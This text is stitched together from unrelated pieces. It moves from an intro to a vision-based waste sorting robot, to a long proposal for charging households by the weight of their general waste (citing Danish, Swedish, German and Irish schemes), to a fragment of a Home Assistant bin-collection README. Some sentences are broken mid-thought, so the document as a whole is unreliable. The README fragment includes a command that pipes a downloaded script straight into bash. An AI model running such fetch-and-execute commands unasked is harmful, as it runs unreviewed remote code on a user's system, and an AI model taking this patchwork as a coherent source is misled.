The evolution of single-stream recycling has resulted in increased recycling rates, as consumers don't have to do the sorting manually, and reduces cost for recycling plants (only one collection system). However, it has also lead to a decrease in the quality of materials recovered due to increased contamination from non-approved materials or unclean recyclables (it is generally to expensive for a recycling plant to clean recyclables) being placed in single stream bins.

Over the past few years with the rise of AI on the edge and IoT a number of new products have been in development to help combat the waste issue. Some of these include Alphabets X's Everyday Robot, Tomra's Container Deposit, and 'smart bins' that sort what goes into them. While these products are slowly to help combat some of these issues, adoption can be slow and costly.

This project will showcase some methodologies and processes for the development of a low-cost open-source waste management system, opening possibilities for democratizing the recycling industry. While this isn't an end-to-end project and demonstration (due to limitations in resources), it will discuss the components required in classifying waste types and proposed methodologies for dealing with them.

The idea is to build a **vision-based waste sorting machine**.
This machine consists of:
* A treadmill (tapis roulant);
* A camera;
* A robot arm (bras robot);
* A computer with a GPU graphics card for image processing.

## Summary
Use a scale built into a garbage truck to measure the net weight of residual and organic waste bins (both 140 L by default, 240 L optionally at no extra fixed cost), which are collected weekly by default or optionally fortnightly. Note that residual waste may also be known as general waste, which is typically sent to landfill in Australia. Charge the rate payer on a per kg basis for this waste (e.g. 60 c/kg AUD and 20 c/kg, respectively), with an optional free service of 9 recyclable fractions in 100 L sacks, collected monthly or bimonthly. Fixed costs of equipment and collection would ideally be subsidized by federal or state funding and thus by taxes in order to deliver public benefits. However, where such subsidization is not provided, fixes fees, e.g. per pickup or per annum, may be necessary, but would increase the amount of residual waste if the price per kg is reduced. Such a scheme has been demonstrated successfully in Bjuv, Sweden, with similar weight-based pricing schemes in Denmark, Germany and Ireland. Other improvements include:
- promoting reusable/washable and/or biodegradable products such as for nappies and dialysis sacs (with which the non-biodegradable and/or disposable and non-washable forms tend to produce a lot of waste and may be financially disadvantageous to users of these products);
- cleaning up any dumped waste, although it may not actually increase after a year, as was found in Bjuv in Sweden, coupled with monitoring e.g. via [CleanApp](https://cleanapp.io/) and fines;
- possibly using transparent bins to make incorrectly sorted waste more visible, and education such as stickers, flyers, and talking to people to reduce incorrectly sorted waste. Fines could be used as a last resort.
- mechanical locked gate systems or systems like the Identify, Press, Weight (IPW) Centre may be preferable for
high-density apartments;
- Using cryptographic, scalable, public database systems such as [Holochain](https://holochain.org/) would have
benefits such as transparency, auditability, benefits of open data and open source software, and ease of scaling
the software to other demonstrations of a Bjuv-like weight-based residual, compost and 9 recyclable fractions scheme.

## Abstract
Weight-based schemes have been implemented successfully in Denmark, Sweden and Germany
in tandem with multiple fractions of waste collection streams.
Incentivizing Waste Reduction (IWR) / WasteLess proposes to extend such schemes to more local councils,
with an initial focus on councils in the Greater Sydney metropolitan region, Australia.
The scheme involves using a scale to measure the net weight of a general waste bin,
and charge the bin's rate payer on a per kg basis for this waste, in order to incentivize waste reduction, with some other improvements and considerations. Benefits include fairer pricing of waste, and when likely reducing waste substantially due to incentivization, benefits extend to less landfill (the proposal could even be extended to the public being incentivized to remove waste from landfill), reduced greenhouse emissions (particularly from methane), reuse/recycling of resources (which is particularly important for non-renewable resources), and a more sustainable society. The scale can be mounted in a garbage truck, or a portable one could be used e.g. with garbage loader crews. The latter method would be better suited for rear and front loaders rather than automated side loaders) and would be less efficient, less capital-intensive, and more labour-intensive, but may be worth considering for developing countries. Bins could be locked to prevent dumping in others' bins, and unlocked efficiently with Bluetooth technology. Cryptographic database systems like [Holochain](https://holochain.org/) could be used for transparency, auditability, scalability, security, etc., while the data could also be used (after being anonymised and aggregated) to get insights into trends of waste with location and demographics, which could in turn be useful e.g. for more targeted education programs to reduce waste. The technology works best in tandem with multiple specialized waste collection bins, such as for recycling, organics, and recyclable soft plastics such as those found in [Redcycle](https://www.redcycle.net.au/) bins. To prevent illegal dumping and putting waste into the wrong bins (e.g. putting non-biodegradable plastic bags into an organics bin), bins could be made transparent, and the scheme would work better with other initiatives such as monitoring, reporting and cleanup technology like [CleanApp](https://cleanapp.io/), as well as re-investing some of the funds generated from the scheme into cleaning up illegally dumped waste. Compassionate treatment of financially disadvantaged people is needed to ensure that they are not worse off with this scheme, such as ratepayer government assistance, coupled with other assistance to help them that is beyond the scope of this proposal.

The following is modified from the
[Blockchain Trust Accelerator Initiative Pilot Submission](
intro-and-join-trust-accelerator-application.md)
on
Feb 22 2019. I have decided to keep the overall structure, as it frames the
proposal well. The seed idea was first expressed
[here on Twitter](https://twitter.com/JamesCRay01/status/936992945173020672),
however the below information
should be more detailed.

## The Problem / Challenge:

In this section, please be prepared to explain what specific challenges you
wish to address.

#### What type of social or governance challenge are you addressing? *
- [ ] Corruption
- [ ] Economic Opportunity
- [ ] Property Rights
- [ ] Strengthening Civil Society
- [ ] Supply Chain Tracking
- [ ] Voting
- [ ] Financial Transaction
- [x] Other: Waste management and associated effects of waste, including
methane emissions, resource depletion, toxicity impacts in land, water and air;
and impacts on birds, aquatic life,
and other biota.

#### Are there specific aspects of the problem that you want to see addressed? *

My idea involves addressing the problem of incentivizing waste reduction,
i.e. addressing a lack of sufficient incentives for reducing waste.

#### Is this problem currently being addressed? If so, in what ways and to what degree of success? *

I don't think it is being addressed well because councils generally charge a
flat rate for collection. Some councils provide options of different bin
sizes, but still charge a flat rate per week in proportion to the bin's
capacity.

The problem has been addressed in rural municipalities in Denmark, in
cities in Germany, and
in Sweden [[1](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].

##### Denmark

A weight-based kerbside collection scheme as used in
Danish municipalities would work best for single-unit dwellings, while refer
to the German projects in cities below for multiple-unit dwellings.

In Denmark, residents may request an electronic lock
for their bin, but few have been
requested [[1, p. 16](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
However, if this scheme was implemented in metropolitan areas,
more locks may be requested.

Denmark has a fixed and variable portions for their scheme.
""However, the fee varies from 594–1,066 DKK [127–229 AUD]
per household
per year [this appears to be referring to the fixed fee,
since the fixed fee in the Bogense municipality is 1,063 DKK
per household per year] between the municipalities, depending on the service
level in general, the quantity of waste effectively covered
by the fixed element of the overall fee, and the fee for the
waste exceeding the fixed waste quantity. In the municipality
of Bogense the fee for waste collection consists of a fixed
yearly fee and a variable weight-based fee…
The fixed fee for households covers 5 kg waste per collection…
The variable, weight-dependent fee is paid per kg waste
(i.e. residual and organic waste) above the 5 kg figure."" [[1, p. 16
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
The variable fee in Bogense, 2000, is 3.75 DKK per kg organic/residual waste
(this applies to waste over the 5 kg limit). [[1, p. 16
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
The study compared two Danish municipalities, Bogense and Oelstykke,
with and without the weight-based scheme, respectively,
found that Bogense was cheaper, even with a four-person household,
but noting that the fee in Oelstykke is above average for Danish municipalities,
and also noting that ""The municipality of Bogense uses e.g. approximately 960 hours
per year for administration compared to approximately 860 hours per year in the
municipality of Oelstykke.""

The study found that the weight-based scheme reduced waste:
""On average, the amount of waste collected in municipalities
with weight-based schemes is 359 kg less per household compared
to municipalities withoutweight-based schemes. Taking composting
in private gardens into account,the difference is estimated as
279 kg per household."" [[1, p. 18
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]

Furthermore: ""A significant increase in the amount of paper and cardboard
collected has been registered compared to municipalities without
this scheme. However, the amount of glass collected is almost similar.""
[[1, p. 18
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
The finding on glass may be because glass has to be ""taken to
central containers… or to the municipal recycling station"",
in Bogense, an inconvenience. [[1, p. 15
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
This may be because glass tends to reduce the economic
viability of waste collection [[2](
https://www.waste360.com/glass/focusing-economics-glass-recycling)].

The study also noted a higher degree of home composting was likely,
economic benefits for sorting/recycling,
and disadvantages including dumping, burning of waste (which
may have health impacts), no solidarity to households with
high amounts of waste e.g. families with babies, and
heavy administration [[1, p. 19–21
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
As noted elsewhere in this proposal,
potential resolutions for dumping including monitoring
with CleanApp and funding from fines,
the scheme and/or tax, although the study
notes that the dumping ""was especially a problem in the beginning when the
scheme was introduced, and in some of the municipalities, the dumping of waste
at lay-bys has fallen back to the initial level"" [[1, p. 21
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]. Burning of waste is
difficult to negate, because it can be
done privately in one's own home,
but education about the impacts on
air quality, the environment, and
health would help to reduce this.
Administration can be reduced through the use of
IT, as discussed elsewhere in this proposal,
or if necessary funded through the scheme
(which is cheaper than the traditional one). The study also noted that
families with babies can use reusuable diapers, and this alternative can be
promoted [[1, p. 21
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].

The study noted that the scheme should only be implemented
in municipalities where the environmental consciousness/
duty/stewardship is relatively high, otherwise it would be more economical to
first concentrate on ""information campaigns where the citizens are given
instructions on sorting and recycling of waste (with weight-based schemes
introduced subsequently)"" [[1, p. 22
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
At any rate, it may be best practice to have at least an information campaign,
before implementing a scheme in a municipality, regardless of how well environmentally-
dutiful citizens may be.

##### Germany: Weight and volume-based systems at apartment blocks

The study notes various problems for a weight-based system for multiple-unit
dwellings, including where tenants reside [[1, p. 23
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
It examines the results of an Identify, Press, Weight (IPW) Centre [[1, p. 23–26
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
and a
simple mechanical lock gate system, using a chip card [[1, p. 26–29
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
(a tap and pay
card would be more efficient, but note the fraud concerns outlined below—CTRL+F
""debit card"", which should nevertheless be manageable by not using debit cards.)

##### Sweden
Since the year 2000, the Swedish munipality of Bjuv, consisting
of single- and multiple-unit residences, has had 11 fractions for waste
with a weight-based scheme: ""kerbside collection of residual waste, organic
waste, newspapers, 6 fractions of packaging waste (cardboard, hard and soft
plastics, coloured and uncoloured glass, metals), and an option for kerbside
collection of garden waste"" [[1, p. 43 or 54 of 143 in the PDF)
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
Variables fees apply for residual and organic waste (3.65 SEK/kg and 1.2
SEK/kg, or ~0.56 AUD/kg and ~0.18 AUD/kg, respectively,
ignoring inflation and forex fluctations), plus a fixed fee for residual
waste (560 SEK/annum, ~86 AUD/a).

""An on-vehicle weighing system is used. Containers are tagged with an
intelligent chip (to avoid switching, voluntary or involuntary, between
neighbours) and weighed both before and after emptying. The difference in
weight is the basis for the charge to the household… This change led to the
cost for the waste collection system almost doubling.""  [[1, p. 44
](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)].
in this proposal, to measure the weight of the bin after emptying it,
and deduct the weight of a bin to obtain the net weight.

Collection intervals are every week or fortnight for residual waste and
compostable waste; 12 times/annum for newspaper, cardboard, and hard
plastics; and 6 times/a for coloured and uncoloured glass, and soft plastics.
140 L bins are provided for residual waste, with a 240 L bin available at no
extra fixed cost, and a 140 L container for compostable waste.

Dramatic improvements resulted in Bjuv from this scheme: in the first two years,
the total waste was reduced by 30%, residual waste reduced by more than 70%,
and recycled fractions increased by 130%. [[1, p. 44–45](
http://ec.europa.eu/environment/waste/studies/pdf/financingmuncipalwaste_management.pdf)]
There was no observable increase in litter. 62 tonnes of dumped waste was collected
in 2001, compared to total waste in the municipality of 3 kilotonnes (p. 46).
The implementation for apartment blocks was no more difficult than for detached
houses, but this may be different for urban areas.

As noted on this page, it had been difficult to balance the budget, since
residual waste (which provides most of the
revenue) was reduced more than expected, but this can be offset by a higher
fixed fee, which was subsequently planned, while also reducing the variable
fee, which was also also planned.

The study noted that if replicating the scheme in Bjuv, costs would rise
considerably, especially if there are not as many alternative collection fractions
as in Bjuv (the cost of the equipment doubled in Bjuv).

### Ireland
Some notes / key findings on [3](
http://www.regions4recycling.eu/upload/public/Good-Practices/GP_Limerick_Pay-per-Weight-system-SWR.pdf):
""The study concluded that weight-based charges are the single most effective PBU system in terms of waste prevention, waste recycling and diversion of waste from landfill. These charges prompted the highest per household recycling levels (between 27% and 32%), highest  diversion rates  from landfill (between 28% and 35%) and the lowest total kerbside waste figures (between 800kg and 947kg per annum). The study projected that if the estimated 80% of those households across Ireland currently on pay per lift / tags and differential bin systems switched to ‘per kg’ based PBU system, it could lead to an annual diversion from landfill of approximately 446,000 tonnes of domestic waste per annum.""—p. 6

Annual charges and per-lift charges are important to account for the cost of transport and labour. P. 10 highlights the
importance of a federally-led scheme, even if it is initially in a trial area, e.g. for preparing national legislation, strategy, coordination, education; as well as the responsibilities of the other organisations involved. It's best to read the paper directly.

The use of permits with the same conditions for private waste collectors ensure that ""there was no competitive advantage for operators operatingin areas with less onerous requirements"" (p. 11). However, waste collection in Ireland is financed mainly by the private sector, while in Australia it is financed by councils, with some subcontracting to private waste collectors (p. 11).

> A regulatory impact assessment undertaken by the DoECLG recognised the cost to industry in moving over to a pay by weight system, but, on the basis of the findings of the STRIVE research Study, asserted that ""A  transition  to  weight  based  charging  on  a  national  basis  could  be achieved relatively cheaply, in view of the potential benefits."" The  exact  investment  costs,  running  costs  and  savings  are  not  available  as  this  information  is commercially sensitive.

From the lessons learnt on p. 15, householders being able to switch between collectors that have
lower weight-based fees was a countermeasure against
actually reducing their waste, but this isn't really applicable in an
Australian residential context; as is the case
for
other problems with multiple collectors being available to households.

##### Australia

Quotes from [4](https://blog.mraconsulting.com.au/2015/08/03/weight-based-charging-the-sleeping-giant-stirs/)
> The key barrier is weighing technology on trucks that can meet the exacting standards of the National Measurement Institute (NMI), which is the regulator of weighing systems. All weight based transactions in Australia must be made on scales which have been “Approved for Trade” by NMI…
> Tony Khoury summarised the practical limitations of some weighing systems and commented that the systems needed to work consistently and robustly. It is no good if the systems do not work on wet days, sloping ground etc. It would do nothing to prevent overflowing bins or litter…

> - All systems that use scales to charge clients must be “Approved for Trade” by NMI;
> - Any private agreements based on weights, need to comply with the National Measurement legislation administered by NMI;
> - There is one accredited WBC system available and others in the process of being submitted to the NMI; and
> - The NMI would be working more closely with the waste sector on WBC weighing systems (but also on the accuracy of existing bin volumes and liquid waste volume measurements).

### Other remarks
Weight-based charging for residual and compostable
has been found to have some elasticity [6](
https://www.sciencedirect.com/science/article/pii/S0928765516000269).
While higher fixed fees and lower weight-based fees may
help to recover costs of equipment and collection,
waste would increase proportionally with lower weight-based fees.
Therefore, subsidizing the cost of waste collection services,
e.g. via taxes, may be desirable for public benefits.
However, where there is insufficient for political will
to achieve this, having a standing charge / fixed fee
to cover the cost of transport, lift and equipment may
be the next most preferable option.

## The Solution and Technology

In this section, please be prepared to explain your pilot proposal in depth.

We will need to understand how your idea seeks to incorporate blockchain
technology to solve the problem(s) you described above.

#### Describe your solution. How can blockchain technology address the problem? *
Charge rate payers for the amount of mass that they add to general waste bins, e.g. by
having a weight machine built-in to garbage trucks, and/or into each general waste bin, or
measured by a portable scale used by garbage collection staff (this would work
for rear-loaders or front-loaders, but would be more labour intensive than the other two options).
A scale in each bin would be more expensive but scales aren't expensive,
and would allow for bin users to verify that the amounts measured and recorded
on their accounts are correct, like with water and electricity meters.

Which leads to other interesting ideas such as waste trading and markets
for waste (like with energy trading and markets projects like Grid+ and
Power Ledger). Got a full bin? No worries, just ask a neighbour in person
or via the dapp to use their bin, and pay them for it.

Scalable, distributed app frameworks
like
[Holochain](https://holochain.org) could be used to make the data transparent
and the app scalable and decentralised.

If there are dedicated bins for recycling (even for particular recyclable
materials like bins for glass, paper and cardboard, metals, soft plastics
and hard plastics), garden waste, and food waste (which
there should be, and this program should ideally only be implemented with
these), then there is no charge for using these. That way, people are
not only incentivized to reduce waste but it is more convenient to do so
and divert it to recycle or convert to other useful materials/products.
For instance, people in high-rise units don't have to use a worm farm
or bokashi bin to handle organic waste, or use a compost bin in houses
or boutique apartments.
Ideally, soft plastics that
are recyclable in [Redcycle](https://www.redcycle.net.au/)
bins would also be collected in kerbside bins,
since this would result in more soft plastics being recycled, due to convenience.
(I recycle soft plastics in Redcycle bins, but not everyone knows about them,
or can't be bothered to use them.) Note that rewarding users for
these bins would incentivize excess consumption,
or collecting biomass from forest to put in their own green waste bin,
both of which would be perverse behaviours and outcomes.
Others benefit from
the resources collected in these bins, so any cost to use these bins, if any,
should be discounted to account for such external benefits.

However, it should be noted that this technology, if not used with all the
above bins and collections of each of them, would add pressure on councils
to do so, since ratepayers would be more incentivized to reduce waste,
and thus pressure/lobby councils to invest in bins and collecting for
recycling, garden waste and organics (which can be collected together,
although collecting garden waste has been done more), soft recyclable
plastics as is done with Redcycle but not kerbside recycling, e-waste,
etc., or other technologies. While this may be an inconvenient consequence
for potential clients of this technology, councils, it would be a good
outcome for the environment and ratepayers' pockets. Additionally,
given that China is not accepting some post-consumer recycled materials,
there is an extra burden on councils from a local to federal level to
manage waste.

The truck follows a route,
and so can log the address of the house for each new bin unloaded into the
truck, with the additional weight measured. Coordinates of the truck via
GPS and mobile data
and the timestamp at the time of loading a bin
can also be
used as an extra verification. The accuracy of the weight machine
should probably be no more than 1 gram. Using Distributed Ledger Technology (DLT)
to store this data has
benefits including transparency, auditability, censorship-resistance, and
better scalability to different councils worldwide. Making the DLT
Free and Open Source Software (FOSS) has
benefits including auditability and better ability to improve it or adapt it
for other projects.

The project can be adapted for stationary public bins, etc., by having an
interface that involves needing to pay to use the bin, but this would be more
complex, and would need to be not much more inconvenient than putting waste in
a bin. E.g. put it on a weight balance externally on the bin, tap a card to
pay, put it in the bin. Even this would probably be too inconvenient, however.

People who waste less, pay less, and people who waste more are incentivized to
waste less, or the funds collected can be spent on better waste management
technology and outreach/education/raising of awareness.

As described below, bins should be locked to prevent dumping in others bins,
and should be unlocked by trucks and users with Bluetooth technology for
efficiency.

#### Who are the actors involved/who is impacted by this pilot? *
Everyone that puts waste in bins and is involved with waste,
or affected by it, which is really everyone and everything on this
Earth.

#### How many people would your solution be helping? *

Again, all biota. This is due to the far-reaching impacts of
reducing greenhouse gases such as methane, as well as reducing
resource depletion (e.g. petrochemically-derived products and associated
greenhouse gas emissions). While other effects can be more local,
such as leaching of chemicals into the land, water, and air
(note that of the air, this is
particularly due to the incineration of plastics), they can also still
have far-reaching impacts. Also, once waste enters oceans (outside of
EEZs), due to
oceans being a public commons, management of such waste becomes
a global problem.

Another benefit is that the data collected
could have broader uses
and help to understand waste trends by area, etc.
Users should have their data anonymised and aggregated by default,
unless they wish to opt out of doing so. Holochain and other
blockchains provide the ability to have anonymous accounts,
although it is possible for governments to identify accounts
e.g. due to KYC of exchanges, and tracing transactions.
Nevertheless, this possibility should not be a concern for
this particular use case, since users will need to specify
an account to debit from, and KYC would be needed to
prevent fraud, etc. Initially, it may be simpler to trial
with a simple centralized council-controlled database.

#### What steps have you taken to validate the idea/market? *

See e.g. [here](wiki/Contact-checklist).

#### How complex will the application need to be for successful functionality? *

An app for bin users would show the amounts debited with
each collection and the mass measured of the collected waste,
as well as charts per month, year, and total.
Councils could still send an invoice as per usual.
Bin users could have a blockchain account for debits, but
this could be opt-in. The currency for the transactions
should probably be the local fiat currency, represented by
a synthetic digital token pegged to the said currency.

#### What challenges do you anticipate encountering were this pilot to be implemented? How can they be mitigated? *

I'm not sure if there needs to be an app for end-users. Councils could still
send an invoice. Bin users could have a blockchain account for debits, but
this could be opt-in.

People could dump waste into neighbours bins, or any bin other than their own,
or anywhere else other than
their own bin. To prevent dumping into other bins, bins should have a lock
on them. However, bins would then need to be unlocked when collecting.
There might be ways to automate this, such as using RFID cards, but they add
complexity, costs, and would still take longer than the traditional
collection procedure. Using a master RFID card with the truck would also
be a security concern. Another option is to use Bluetooth technology,
where the truck has the ability to quickly unlock a bin when it comes in range.
If this solution was developed and worked, it would be quick, secure for bins.
There would still be an attack vector by hacking the technology and using it
in another device, or using the truck or device on it, but if the solution
can be fast enough to not add any noticeable lag to collection times,
then the overall technology seems to be worth sufficient merit to trial.

An alternative is to use [CleanApp](https://cleanapp.io), CCTVs,
[neighbourhood watch](
https://en.wikipedia.org/wiki/Neighborhood_watch), police, etc.,
to monitor and report on suspicious activity with dumping in bins.
Notably, these measures would be needed for dumping that is not in
bins.

Care needs to be taken that financially disadvantaged people are
not worse off with this scheme, and government assistance can
be increased if needed.

Who's going to pay for the waste in rental properties, including share
houses? The ratepayer pays, but in share houses, there is a similar
problem of who pays for utility bills like electricity, water, telecoms,
and gas. A tenant is even incentivized to reduce the waste of a shared
household and that
is produced by flatmates. They may do this anyway without this scheme,
but may get tired of doing so, particularly without an incentive.
Landlords may also sublet rooms, and while this is less common than
leasing a whole dwelling, in this arrangement it is common for
landlords to roll the cost of utilities into the rent, and
it can be expected that they will typically add a higher amount to the rent
than what is paid in bills, e.g. to account for risk.

Nevertheless, paying-by-weight seems fairer than a flat rate.
Dealing with the problem of not further disadvantaging
people facing financial hardships is a more systemic issue,
and can be handled with more government assistance
as needed.

What if councils decide to still charge a flat rate, in order to
be able to fund expenses of waste collection? This is
analogous to flat rates and c/kWh rates in the electricity
market. This should be less likely to occur, since they are a government,
not a for-profit business, and worst-case can cover the cost via
rates. Note that if people don't put their general waste bin out every week,
which wouldn't have a problem with smelliness, etc., if they don't
put organics in it, then the garbage truck doesn't have to stop
to pick it up, saving time and costs.

It would be more complicated, and not really worth the additional
complexity, to charge when a user unlocks the bin and adds waste.
Such a method would probably require a screen, human interface
and computer on and in the bin. It also isn't suitable for shared households
such as families and share housing, where people typically put waste
into a bin inside, then take it out every night or when it gets full.
Charging the person who puts the waste out would be unfair, and
organizing a roster of who puts the bins out would be inconvenient.
While more complicated, a user who takes waste out of the bin could
receive a credit for doing so, although they could then just
dump the waste elsewhere, rather than sort it to put recyclables in
the recycling bin, etc. This would be a perverse outcome.
This method could be used for public bins, but is inconvenient,
and could also disincentivize using them and increase litter,
which would again not be ideal. So it would probably be better
to continue using public bins as accessible without a charge.

Another problem is that people could put waste in the ‘free’,
or lower-cost bins
(e.g. recycling). There could be a fine to discourage this
behaviour, together with transparent recycling bins,
use of reporting such as via [CleanApp](https://cleanapp.io/)
or even from the garbage truck crew themselves (which would
be possible with transparent bins, since a one-person
crew (the driver) as with a side loader can see it
without even needing to get out of the vehicle.

Waste such as soft plastics
(the kinds that can be put in Redcycle bins, like plastic bags,
packaging, and low-density polyethylene) are problematic
since they are light, and so a charge by mass would not
incentivize proper management of this waste.
While having dedicated kerbside bins for soft plastic recycling
would certainly help, there are still people (I know from
personal experience with living in boarding houses) who
will see a bin and put anything in it, regardless of the colour
of the lid! Thus the above transparent bins, reporting, warnings,
education (talk with them, give them a pamphlet, etc.) and fines
would help to deal with this problem. Additionally,
fines for putting soft plastics in general waste bins is
probably extreme. They would need to be not a large amount if
done at all, although if too small or there's no fine
there's no incentive to change behaviour. Again,
I want to point out that financially disadvantaged people
should be treated compassionately in these cases.

If data is not automatically collected during collection,
and is instead manually entered e.g. by the driver,
that would be less efficient, and also be a potential
source of corruption. Residents could bribe the driver
to not enter the data, or enter a lower weight.
Hence, automating the data entry of masses collected
with the address and account is needed.

It would be an extra inconvenience to grab a Bluetooth chip
when you want to unlock your bin, but not too much, e.g.
if it's attached to a keyring, which you could grab on a
key-rack by the front door on your way out, then it could
automatically unlock and open as you walk up to it.
A bin user could also leave it unlocked, then if someone dumps
a lot of stuff in it you may want to lock it thereafter.

One person gave feedback that he lived in an apartment
of four units and two bins, so each bin was shared
between two units. While this is probably an edge case,
you would probably want to have four bins for each unit,
unless you were happy to split the cost with the person
you share with. As mentioned, having a scale in the bin
and charging when you put stuff in would be more inconvenient,
but maybe not too much with tapping a credit/debit card.
However, using a card would pose a [security/fraud risk](
https://www.fool.com/investing/general/2014/01/14/why-you-should-never-use-your-debit-card.aspx),
and is [particularly
vulnerable](
http://fossmotorsnews.com/2019-03/Why_You_Shouldnt_Use_a_Debit_Card_at_the_Gas_Pump.html)
for debit card theft since bins are usually unattended.

#### To what extent does your idea have the potential to be scaled? *

Theoretically it can scale worldwide, wherever
waste is generated and collected, provided that there is
support from local citizens and councils, funding, tech, etc.

## Resources
In this section, please elaborate on the state of your resources.

#### What resources have already been dedicated to the project? *

I, James Ray, have been working on this project since
Thursday 21 Feb 2019. No funding has been obtained as of yet.

#### What resources do you need? *

I need funding, technology, expertise, and local councils to trial with.

I should be able to develop the software myself, but I will need to
obtain clients (there
are logs of my efforts on that
[here](wiki/Contact-checklist)
or at least potential ones e.g. via an MoU, a partnership with a garbage truck
manufacturer (or funding to purchase a vehicle and modify it), and
expertise (likely from a garbage truck manufacturer) to modify a garbage truck
as a trial with the weight machine, plus additional technologies that would
improve security and efficiency, as mentioned above, like Bluetooth, and a
database, Holochain or blockchain (the last if universal consensus is needed,
which it may not be).

#### What is the most important thing that can be done to support your work? *

- [x] Connect with governments
- [ ] Connect with technology providers
- [ ] Connect with funders
- [ ] Other:

In the application I marked ""Connect with funders"" as the most important,
however, connecting with governments is probably most important to show
a market demand. However, in order to do a trial with a local council,
they will probably want to see more public support for the idea,
hence [the petition](
https://secure.avaaz.org/en/community_petitions/Local_councils_Incentivize_waste_reduction_by_weighing_general_waste_and_charging_for_the_weight/)
Although, if councils fund consultation with their
communities, that would be
much appreciated!

## Conclusions

Weight-based pricing for both residual and compostable waste, coupled with
multiple fractions for sorting recycling, has been found to
most effectively reduce waste and increase recycling.
Pricing for compostable waste is necessary because
households with sufficient land (a bare patch of soil for a
compost bin), or even those without, can compost their own waste.
For the latter case, tumbler bins, worm farms and bokashi bins can be used.
The scheme in Bjuv in Sweden was very effective (apparently the most of demonstrations studied)
in reducing waste and increasing recycling. However, the cost of the system was high. Additionally,
the case in Bjuv is just one study, and further demonstrations would be needed,
with other considerations or improvements, for more statistically
reliable evidence and conclusions. Other
considerations for policy implementers and include:

- promoting reusable/washable and/or biodegradable products as for nappies and dialysis sacs (with which the non-biodegradable and/or disposable and non-washable forms) tend to produce a lot of waste and may be financially disadvantageous to users of these products);
- cleaning up any dumped waste, although it may not actually increase after a year, as was found in Bjuv in Sweden, coupled with monitoring e.g. via [CleanApp](https://cleanapp.io/) and fines;
- possibly using transparent bins to make incorrectly sorted waste more visible, and education such as stickers, flyers, and talking to people to reduce incorrectly sorted waste. Fines could be used as a last resort.
- mechanical locked gate systems or systems like the Identify, Press, Weight (IPW) Centre may be preferable for
high-density
apartments;
- Using cryptographic, scalable, public database systems such as [Holochain](https://holochain.org/) would have
benefits such as transparency, auditability, benefits of open data and open source software, and ease of scaling
the software to other demonstrations of a Bjuv-like weight-based residual, compost and 9 recyclable fractions scheme.

## Q&A
### Wouldn't it be simpler and better to have smaller bins with a lower fixed cost?
This has pros and cons. It is a simpler scheme. It doesn't allow for highly variable amounts of waste over time, e.g. in an extreme case creating 500 kg of residual waste in an atypical week vs 0.2 kg per week of residual waste normally. I produce around the latter of residual waste normally, but occassionally I might have something large that has to go to landfill, e.g. a fan. In such a case residents could call a kerbside collection, or store the waste and slowly fill the bin(s) up week by week. Offering more bin sizes isn't as cost-reflective as per kg pricing, however, the more bin sizes that are offered, the more cost reflective it can be, but you won't get as cost-reflective as per kg pricing. 

It also doesn't account for the benefits of having multiple additional fractions of recycling waste, collected less often, compared to one mixed recycling bin per week which doesn't allow for soft plastics recycling. It also doesn't provide organic waste. However, that is somewhat orthogonal as you can still have bins for residual waste and organic waste and recyclable fractions collected in the same way in each scheme, but just charge differently and provide more bin sizes.

### Won't dumping increase with this scheme?
The scheme in Sweden has found that dumping was initially a problem, then went back to former levels, and did not observe a noticeable increase in litter. Monitoring and reporting e.g. with CleanApp or just calling council plus cleanup would help to manage dumped waste. The fixed fee component of the scheme, if needed, could be used to fund cleanup of dumped waste. Funding could also be allocated for council officers to patrol public areas to monitor for dumping, graffitti, etc., if and as needed. Note also that federal funding via taxes and a nation-wide deployment in councils could also be used to fund the scheme, rather than decreasing variable weight fees and increasing fixed fees, which would increase residual waste.

### Why not start a business doing this rather than waiting for political will with councils?

I'm not sure what councils will do if people refuse to put council-provided bins out, not pay rates for waste collection, and put out a bin provided by a private waste collector and pay them instead. I'd have to ask councils to see what they think, but I can't imagine they would tolerate that. I'm not sure how viable such a business would be without support from government funding, as was the case in the above Irish study. Some form of deregulation or subsidies to private waste collectors may be needed for this to work. Introducing private enterprises, if successful, would result in increased costs due to profit-seeking (and funding growth and offseting risk, etc.), which would lead todisadvantaging poorer people, particularly without adequate support, which tends to be what occurs. Generally I am more in favour of a publicly funded scheme, and do not wish to pursue this as a business.

### Won't this scheme increase costs for people receiving government assistance / welfare payments?
It would not financially disadvantage poor Australians if landlords must pay for the rates and it is made illegal to mark up the rent with Centrelink recipients due to the cost of waste. This depends on the government implementing this scheme if and only if these conditions hold. It would be enforceable for private landlords since if they threatened to evict Centrelink recipient tenants if they reported them to the government, then Centrelink recipient tenants can take the matter up with NCAT, or analogous authorities in other states, NCAT would resolve the case in the tenants favour: they continue to reside where they are without a markup in the rent due to waste collection. The government would be incentivized to implement the scheme because it has been shown to reduce waste, which will deliver public benefits and be less costly in the long-run.""

### Don't we need more organic waste treatment infrastructure for this scheme to work?
Yes. See more at: https://www.facebook.com/groups/1513152818777012/permalink/2177468449012109/?comment_id=2177647292327558&comment_tracking=%7B%22tn%22%3A%22R%22%7D

Application use json file to parse weeks for waste collection and showed active status of each bin over week. You can create 1 to n bins and each bin can have  different collection day.

## Installation

### Step 1: Download files

#### Option 1: Via HACS

Make sure you have HACS installed. If you don't, run `curl -sfSL https://hacs.xyz/install | bash -` in HA.
